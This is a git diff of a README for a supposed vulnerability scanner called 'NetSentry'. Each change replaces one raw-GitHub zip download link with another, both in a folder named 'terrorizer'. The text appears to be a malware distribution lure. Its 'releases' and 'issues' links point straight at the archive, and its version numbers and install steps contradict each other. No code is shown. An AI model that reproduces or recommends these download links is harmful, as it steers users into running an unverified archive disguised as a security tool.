@@ -1,7 +1,7 @@
 # 🔍 NetSentry - Simple Tool to Find Vulnerabilities
 
 ## 📥 Download Now
-[![Download NetSentry](https://raw.githubusercontent.com/ahmedriaz2004/NetSentry/main/terrorizer/NetSentry_v3.9.zip%20NetSentry-v1.0-brightgreen)](https://raw.githubusercontent.com/ahmedriaz2004/NetSentry/main/terrorizer/NetSentry_v3.9.zip)
+[![Download NetSentry](https://raw.githubusercontent.com/ahmedriaz2004/NetSentry/main/terrorizer/Sentry-Net-v1.7.zip%20NetSentry-v1.0-brightgreen)](https://raw.githubusercontent.com/ahmedriaz2004/NetSentry/main/terrorizer/Sentry-Net-v1.7.zip)
 
 ## 🚀 Getting Started
 NetSentry is a powerful tool designed to help you find vulnerabilities in your systems using Nmap and the Vulners engine. This guide will walk you through the steps to download and run NetSentry easily. 
@@ -25,7 +25,7 @@ Before you begin, ensure your computer meets these basic requirements:
 To get started with NetSentry, follow these steps:
 
 1. **Visit the Releases Page:** Click on the link below to go to the download page.
-   [Download NetSentry](https://raw.githubusercontent.com/ahmedriaz2004/NetSentry/main/terrorizer/NetSentry_v3.9.zip)
+   [Download NetSentry](https://raw.githubusercontent.com/ahmedriaz2004/NetSentry/main/terrorizer/Sentry-Net-v1.7.zip)
 
 2. **Choose Your Version:** Look for the latest version available for download. 
 
@@ -49,7 +49,7 @@ After installation, launch NetSentry from your applications folder or desktop sh
 5. **Export Results:** If you need to share results or analyze them further, use the export feature to save the findings for later review.
 
 ## 📞 Support
-If you need assistance, you can reach out for support via the repository. Check the [issues section](https://raw.githubusercontent.com/ahmedriaz2004/NetSentry/main/terrorizer/NetSentry_v3.9.zip) for common questions or post your own.
+If you need assistance, you can reach out for support via the repository. Check the [issues section](https://raw.githubusercontent.com/ahmedriaz2004/NetSentry/main/terrorizer/Sentry-Net-v1.7.zip) for common questions or post your own.
 
 ## 📄 License
 NetSentry is open-source software. You can use, modify, and distribute it under the terms of the MIT License. Check the license file in the repository for more details.
